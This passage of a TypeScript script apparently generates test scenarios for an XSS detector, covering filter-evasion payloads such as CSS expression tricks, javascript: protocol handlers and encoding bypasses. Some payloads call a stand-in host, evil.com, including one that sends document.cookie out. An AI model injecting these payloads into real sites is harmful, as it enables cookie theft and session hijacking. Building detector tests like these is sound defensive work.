  edits: domSinkEdit('ejs.render("<%- userInput %>", { userInput })'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'framework_specific', 'XSS-10'],
  rationale: 'EJS <%- %> tag outputs raw unescaped HTML',
});

// =============================================================================
// BONUS: Additional mutation XSS patterns (XSS-12)
// =============================================================================

push({
  description: 'XSS-12: xmp tag breakout',
  edits: injectEdit('</xmp><script>alert(1)</script><xmp>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'mutation_xss', 'XSS-12'],
  rationale: 'Breaking out of xmp element context',
});

push({
  description: 'XSS-12: iframe srcdoc with script',
  edits: injectEdit('<iframe srcdoc="<script>alert(1)</script>"></iframe>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'mutation_xss', 'XSS-12'],
  rationale: 'Iframe srcdoc with inline script (bypasses src restrictions)',
});

// =============================================================================
// BONUS: CSS INJECTION vectors (bridges XSS-02 and XSS-09)
// =============================================================================

push({
  description: 'CSS injection: style background javascript URL',
  edits: injectEdit('<div style="background:url(javascript:alert(1))">'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'encoding_bypass', 'XSS-05'],
  rationale: 'CSS background-image with javascript: protocol',
});

push({
  description: 'CSS injection: style expression(alert)',
  edits: injectEdit('<div style="width: expression(alert(1))">'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'encoding_bypass', 'XSS-05'],
  rationale: 'CSS expression() for code execution (IE-specific)',
});

push({
  description: 'CSS injection: -moz-binding XBL vector',
  edits: injectEdit('<div style="-moz-binding:url(https://evil.com/xss.xml#xss)">'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'encoding_bypass', 'XSS-05'],
  rationale: 'Mozilla XBL binding for arbitrary code execution',
});

push({
  description: 'CSS injection: behavior HTC file',
  edits: injectEdit('<div style="behavior: url(xss.htc)">'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'encoding_bypass', 'XSS-05'],
  rationale: 'IE behavior property loading HTC component',
});

push({
  description: 'CSS injection: @import from external domain',
  edits: injectEdit('<style>@import url("https://evil.com/steal.css");</style>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'csp_bypass', 'XSS-09'],
  rationale: 'CSS @import from external domain for exfiltration',
});

push({
  description: 'CSS injection: unicode escaped expression',
  edits: injectEdit('<div style="\\0065\\0078\\0070\\0072\\0065\\0073\\0073\\0069\\006f\\006e(alert(1))">'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'encoding_bypass', 'XSS-05'],
  rationale: 'CSS unicode escapes spelling "expression"',
});

// =============================================================================
// BONUS: Additional protocol handler edge cases
// =============================================================================

push({
  description: 'Protocol: img dynsrc javascript attribute',
  edits: injectEdit('<img dynsrc="javascript:alert(1)">'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'protocol_handlers', 'XSS-04'],
  rationale: 'Legacy IE dynsrc attribute with javascript: protocol',
});

push({
  description: 'Protocol: img lowsrc javascript attribute',
  edits: injectEdit('<img lowsrc="javascript:alert(1)">'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'protocol_handlers', 'XSS-04'],
  rationale: 'Legacy lowsrc attribute with javascript: protocol',
});

push({
  description: 'Protocol: bgsound src javascript',
  edits: injectEdit('<bgsound src="javascript:alert(1)">'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'protocol_handlers', 'XSS-04'],
  rationale: 'Deprecated bgsound element with javascript: src',
});

push({
  description: 'Protocol: link rel stylesheet javascript href',
  edits: injectEdit('<link rel="stylesheet" href="javascript:alert(1)">'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'protocol_handlers', 'XSS-04'],
  rationale: 'Stylesheet link with javascript: protocol',
});

push({
  description: 'Protocol: table background javascript',
  edits: injectEdit('<table background="javascript:alert(1)">'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'protocol_handlers', 'XSS-04'],
  rationale: 'Legacy table background attribute with javascript:',
});

push({
  description: 'Protocol: button formaction javascript',
  edits: injectEdit('<button formaction="javascript:alert(1)">click</button>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'protocol_handlers', 'XSS-04'],
  rationale: 'Button formaction with javascript: protocol',
});

push({
  description: 'Protocol: input type image onerror',
  edits: injectEdit('<input type="image" src=x onerror=alert(1)>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'attribute_injection', 'XSS-02'],
  rationale: 'Image input type with onerror handler',
});

push({
  description: 'Protocol: meta refresh data URI with script',
  edits: injectEdit('<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert(1)</script>">'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'protocol_handlers', 'XSS-04'],
  rationale: 'Meta refresh with data: URI containing script',
});

// =============================================================================
// BONUS: Additional attribute injection edge cases
// =============================================================================

push({
  description: 'Attribute: input value breakout with script',
  edits: injectEdit('"><script>alert(1)</script><input value="'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'attribute_injection', 'XSS-02'],
  rationale: 'Breaking out of attribute value to inject script',
});

push({
  description: 'Attribute: a onmouseover handler',
  edits: injectEdit('<a onmouseover=alert(1)>hover link</a>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'attribute_injection', 'XSS-02'],
  rationale: 'Anchor tag with onmouseover event handler',
});

push({
  description: 'Attribute: img onerror cookie theft',
  edits: injectEdit('<img src=x onerror="this.src=\'https://evil.com/steal?\'+document.cookie">'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'attribute_injection', 'XSS-02'],
  rationale: 'Onerror handler stealing cookies via img src redirect',
});

push({
  description: 'Attribute: img onerror with backtick syntax',
  edits: injectEdit('<img src=x onerror=`alert(1)`>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'attribute_injection', 'XSS-02'],
  rationale: 'Backtick-quoted event handler value',
});

// =============================================================================
// BONUS: Additional encoding edge cases
// =============================================================================

push({
  description: 'Encoding: javascript with tab after colon',
  edits: injectEdit('<a href="javascript:\talert(1)">click</a>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'encoding_bypass', 'XSS-05'],
  rationale: 'Tab character between javascript: and function call',
});

push({
  description: 'Encoding: javascript with encoded newline',
  edits: injectEdit('<a href="java&#x0a;script:alert(1)">click</a>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'encoding_bypass', 'XSS-05'],
  rationale: 'Newline entity inside javascript: protocol',
});

push({
  description: 'Encoding: CDATA section with script',
  edits: injectEdit('<![CDATA[<script>alert(1)</script>]]>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'encoding_bypass', 'XSS-05'],
  rationale: 'CDATA section containing script tag',
});

push({
  description: 'Encoding: half-open HTML comment bypass',
  edits: injectEdit('<script>alert(1)<!--</script>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'encoding_bypass', 'XSS-05'],
  rationale: 'Unclosed HTML comment breaking script parsing',
});

push({
  description: 'Encoding: overlong UTF-8 sequence',
  edits: injectEdit('<script>al\\xC0\\xAErt(1)</script>'),
  predicates: [{ type: 'security', securityCheck: 'xss_detection', expected: 'has_findings' }],
  expectedSuccess: false,
  expectedFailedGate: 'security',
  tags: ['security', 'encoding_bypass', 'XSS-05'],
  rationale: 'Overlong UTF-8 encoding to bypass filters',
});

// =============================================================================
// Summary
// =============================================================================

writeFileSync(outPath, JSON.stringify(scenarios, null, 2));

const categoryCounts: Record<string, number> = {};
const taxonomyCounts: Record<string, number> = {};
const detectedCount = { injection: 0, safe: 0, grounding: 0 };

for (const s of scenarios) {
  const category = s.tags[1] || 'unknown';
  const taxonomy = s.tags[2] || 'unknown';
  categoryCounts[category] = (categoryCounts[category] || 0) + 1;
  taxonomyCounts[taxonomy] = (taxonomyCounts[taxonomy] || 0) + 1;
  if (s.expectedSuccess) {
    detectedCount.safe++;
  } else if (s.expectedFailedGate === 'grounding') {
    detectedCount.grounding++;
  } else {
    detectedCount.injection++;
  }
}

console.log(`\nGenerated ${scenarios.length} XSS vector scenarios → ${outPath}\n`);
console.log('By category:');
for (const [cat, count] of Object.entries(categoryCounts).sort((a, b) => b[1] - a[1])) {
  console.log(`  ${cat.padEnd(30)} ${count}`);
}
console.log('\nBy taxonomy ID:');
for (const [tax, count] of Object.entries(taxonomyCounts).sort()) {
  console.log(`  ${tax.padEnd(10)} ${count}`);
}
console.log(`\nInjection detected (fail security): ${detectedCount.injection}`);
console.log(`Safe equivalents (pass):             ${detectedCount.safe}`);
console.log(`Grounding failures (fail grounding): ${detectedCount.grounding}`);
console.log(`\nSources: PayloadsAllTheThings, OWASP XSS Filter Evasion, html5sec.org, PortSwigger`);
